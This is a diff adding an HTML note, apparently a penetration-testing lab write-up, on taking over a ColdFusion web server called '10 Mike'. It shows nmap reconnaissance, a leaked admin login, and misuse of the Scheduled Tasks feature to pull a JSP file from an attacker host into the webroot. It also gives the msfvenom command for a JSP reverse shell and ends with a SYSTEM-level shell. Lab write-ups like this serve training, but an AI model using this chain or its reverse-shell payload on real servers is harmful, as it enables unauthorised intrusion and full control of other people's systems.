@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10 Mike</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10 Mike</h1><br/>nmap showed that 80 was the only port running<br />nmap web enum showed gave up a hash due to the version of cold fusion<br />username admin password pass123<br />once in I <br />Debugging &amp; logging &gt; Scheduled Tasks &gt; taskname: yee &gt; one-time &gt; url: <a href="http://10.11.0.186:8000/443.jsp">http://10.11.0.186:8000/443.jsp</a> &gt; username: admin &gt; password &gt; pass123 <br />&gt; publish: CHECK &gt; file: C:\Inetpub\wwwroot\CFIDE\443.jsp &gt; submit<br /><br />NOTE: file location was leaked at       server settings &gt; mappings<br /><br />msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.186 LPORT=443 -f raw &gt; 443.jsp<br />^^Hosted file<br /><br />start msfconsole listener<br />run scheduled task<br />navigate to             <a href="http://10.11.1.10/CFIDE/443.jsp">http://10.11.1.10/CFIDE/443.jsp</a><br /><br />got shell!!<br />whoami<br />    nt authority/system<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />nmap -vv --reason -Pn -sV -p 80 --script=&quot;banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&quot; 10.11.1.10</div></body></html>
